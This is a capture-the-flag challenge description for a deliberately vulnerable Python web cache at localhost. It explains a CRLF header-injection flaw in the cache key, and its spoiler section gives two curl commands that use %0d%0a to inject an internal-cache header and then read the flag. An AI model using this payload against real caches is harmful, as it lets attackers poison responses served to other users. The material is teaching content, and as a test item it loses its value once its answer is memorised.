# w16 :: Cache Poison

- **Category:** Web
- **Difficulty:** easy
- **Stack:** Python 3.12 / stdlib only (hand-rolled HTTP responses)
- **URL:** http://localhost:30016

## Brief

CACHE POISON is a cache-aware preview node. It fronts a preview service, and for
every preview request it mints an `X-Cache-Key` from the requested URL and from
the client-supplied `X-Forwarded-Host`. The key is written into the response
header block, and the node caches the whole block so the next request for the
same URL is a cheap replay.

The node treats a cache entry as **internal** when the entry carries the marker
header `X-Internal-Cache: 1`. The edge is documented as stripping that header
from outside traffic, so a direct request to the internal route is refused.

The cache key is built by string concatenation, and the part that comes from the
URL is URL-decoded and written into the header with no CR/LF screening.

## Goal

Get the internal representation of a normal URL cached, then read it, and submit
the flag.

## Hint

The landing page documents the cache policy, the one trusted request header, and
the one header the edge strips. A cache key should never contain a newline.

`%0d%0a` is two bytes that end a header line. Where does the name in
`/page?name=` end up?

<details>
<summary>Spoiler</summary>

Poison the cached representation of a URL, then re-request it:

```bash
# 1. poison: the CRLF ends the X-Cache-Key line, the next line is the marker
curl -s -o /dev/null --path-as-is \
  'http://localhost:30016/page?name=x%0d%0aX-Internal-Cache:%201'

# 2. read: cache HIT replays the stored block, now treated as internal
curl -s --path-as-is \
  'http://localhost:30016/page?name=x%0d%0aX-Internal-Cache:%201' \
  | grep -o 'hex4b0t{[^}]*}'
```

`solution/probe.sh` asserts the guard is live (a direct `/admin/flag` is 403), that
a benign request does not leak the marker, and that the two-step sequence yields
the flag.

</details>
